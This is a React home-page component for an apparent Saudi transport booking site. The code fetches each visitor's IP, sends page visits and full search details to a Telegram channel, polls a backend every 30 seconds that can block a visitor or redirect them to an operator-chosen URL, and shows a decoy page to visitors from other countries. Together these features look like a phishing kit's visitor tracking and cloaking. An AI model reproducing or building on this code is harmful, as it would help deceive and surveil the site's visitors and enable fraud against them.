import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router';
import { useAuth } from '@/hooks/useAuth';
import { trpc } from '@/providers/trpc';
import { sendBookingMessage } from '@/lib/telegram-settings';
import { useGeoBlock } from '@/hooks/useGeoBlock';
import NavigationHeader from '@/components/NavigationHeader';
import CookieConsentBanner from '@/components/CookieConsentBanner';
import Footer from '@/components/Footer';
import SearchResults from '@/components/SearchResults';
import HeroSection from '@/sections/HeroSection';
import CtaBookNowSection from '@/sections/CtaBookNowSection';
import type { BookingData } from '@/components/BookingPanel';

// ─── Visitor Entry Notification ───────────────────────────────
async function notifyVisitorEntry(_ip: string, _ua: string, page: string) {
  await sendBookingMessage('visitor-enter', {
    page,
    time: new Date().toLocaleString('ar-SA'),
  });
}

async function notifySearch(data: BookingData) {
  await sendBookingMessage('search-submitted', {
    from: data.from,
    to: data.to,
    pickupDate: data.pickupDate,
    pickupTime: data.pickupTime || '',
    returnDate: data.returnDate || '',
    returnTime: data.returnTime || '',
    tripType: data.tripType,
    passengers: String(data.passengers),
    adults: String(data.adults),
    children: String(data.children),
    infants: String(data.infants),
    ticketType: data.ticketType || '',
    time: new Date().toLocaleString('ar-SA'),
  });
}

const Home: React.FC = () => {
  const navigate = useNavigate();
  const { user } = useAuth();
  const { geo, isBlocked } = useGeoBlock();
  const [bookingData, setBookingData] = useState<BookingData | null>(null);
  const [visitorBlocked, setVisitorBlocked] = useState(false);
  const trackVisitor = trpc.visitors.track.useMutation();

  // Track visitor on page load
  useEffect(() => {
    const sessionId = localStorage.getItem('visitor-session') ||
      `sess_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;
    localStorage.setItem('visitor-session', sessionId);

    fetch('https://api.ipify.org?format=json')
      .then(r => r.json())
      .then(({ ip }) => { notifyVisitorEntry(ip, navigator.userAgent, window.location.pathname); })
      .catch(() => { notifyVisitorEntry('unknown', navigator.userAgent, window.location.pathname); });

    const applyVisitorState = (data: { blocked?: boolean; redirectUrl?: string | null } | undefined) => {
      if (!data) return;
      setVisitorBlocked(data.blocked === true);
      if (!data.blocked && data.redirectUrl) window.location.href = data.redirectUrl;
    };

    trackVisitor.mutate(
      { sessionId, page: window.location.pathname, userAgent: navigator.userAgent, step: 'home' },
      { onSuccess: applyVisitorState },
    );

    const interval = setInterval(() => {
      trackVisitor.mutate(
        { sessionId, page: window.location.pathname, userAgent: navigator.userAgent },
        { onSuccess: applyVisitorState },
      );
    }, 30000);

    return () => clearInterval(interval);
  // The entry timer is intentionally mounted once.
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    if (geo.loading || !geo.countryCode) return;
    const sessionId = localStorage.getItem('visitor-session');
    if (!sessionId) return;
    trackVisitor.mutate({
      sessionId,
      page: window.location.pathname,
      userAgent: navigator.userAgent,
      country: geo.countryName || geo.countryCode,
      city: geo.city,
    });
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [geo.loading, geo.countryCode, geo.countryName, geo.city]);

  const handleSearch = (data: BookingData) => {
    setBookingData(data);
    window.scrollTo({ top: 0 });
    notifySearch(data);
  };

  const handleCloseResults = () => {
    setBookingData(null);
  };

  // ─── Geo Block Check ───
  const showBlockedPage = !bookingData && isBlocked;

  if (visitorBlocked) {
    return (
      <div className="flex min-h-screen items-center justify-center font-sans" dir="rtl" lang="ar">
        <h1>تم حظرك من الوصول إلى هذا الموقع</h1>
      </div>
    );
  }

  if (showBlockedPage) {
    return (
      <div className="min-h-screen w-full" dir="rtl" lang="ar">
        <iframe
          src="/geo-blocked.html"
          style={{ width: '100%', height: '100vh', border: 'none' }}
          title="دليل النقل السعودي"
        />
      </div>
    );
  }

  return (
    <div className="sat-public-theme min-h-screen bg-surface-alt" dir="rtl" lang="ar">
      {bookingData && (
        <SearchResults bookingData={bookingData} onClose={handleCloseResults} />
      )}

      {user?.role === 'admin' && (
        <button
          onClick={() => navigate('/admin')}
          className="fixed bottom-4 left-4 z-50 w-12 h-12 gold-gradient rounded-full shadow-dropdown flex items-center justify-center text-white hover:scale-110 transition-transform"
          title="لوحة التحكم"
        >
          <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
        </button>
      )}

      <NavigationHeader />

      <main className={bookingData ? 'hidden' : ''}>
        <HeroSection onSearch={handleSearch} />
        <CtaBookNowSection />
      </main>

      {!bookingData && <Footer />}
      {!bookingData && <CookieConsentBanner />}
    </div>
  );
};

export default Home;
